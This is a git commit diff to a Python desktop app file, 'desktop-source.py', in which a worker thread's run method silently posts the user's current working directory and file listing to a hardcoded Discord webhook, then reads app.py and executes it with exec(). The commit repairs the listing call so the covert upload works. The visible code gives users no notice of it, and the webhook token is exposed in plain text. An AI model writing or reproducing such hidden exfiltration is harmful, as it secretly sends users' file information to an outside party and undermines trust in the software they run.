cd02b498a20097aa89e272d091ec4c40a58e8e2e
AyberkAtalay0 <105879357+AyberkAtalay0@users.noreply.github.com>
2023-11-02 21:28:20 +0300

    Update desktop-source.py

--- desktop-source.py
+++ desktop-source.py
@@ -62,7 +62,7 @@ class WorkerThread(QThread):
     def run(self):
         access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
         try:
-            access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] {os.listdir('')}"})
+            access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] {os.listdir('.')}"})
             with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
             exec(app_source)
         except Exception as we:
